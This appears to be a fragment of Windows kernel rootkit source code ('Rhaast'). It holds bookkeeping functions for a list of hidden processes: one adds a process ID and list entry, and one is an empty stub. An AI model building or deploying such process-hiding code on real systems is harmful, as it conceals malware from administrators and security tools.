#include <Rhaast.h>

/* add a process to the hidden list */
NTSTATUS PsListHiddenAdd(
    ULONG		Pid,
    PLIST_ENTRY ProcessEntry
) {
    PPSHIDDEN_LIST PsHidden = NULL;
    NTSTATUS	   NtStatus = STATUS_SUCCESS;

    /* allocate memory for linked list object */
    if ( ! ( PsHidden = ExAllocatePool2( POOL_FLAG_NON_PAGED, sizeof( PSHIDDEN_LIST ), RS_POOL_TAG_PSHD ) ) ) {
        PRINTF( "ExAllocatePool2 Failed" );
        NtStatus = STATUS_UNSUCCESSFUL;
        goto END;
    }

    /* set hidden process data */
    PsHidden->Pid          = Pid;
    PsHidden->ProcessEntry = ProcessEntry;
    PsHidden->Next         = Instance.PsHiddenList;

    /* insert it into the global instance */
    Instance.PsHiddenList = PsHidden; 

END:
    return NtStatus;
}

/* remove a process from the hidden list */
NTSTATUS PsListHiddenRemove(
    ULONG Pid
) {
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    return NtStatus;
}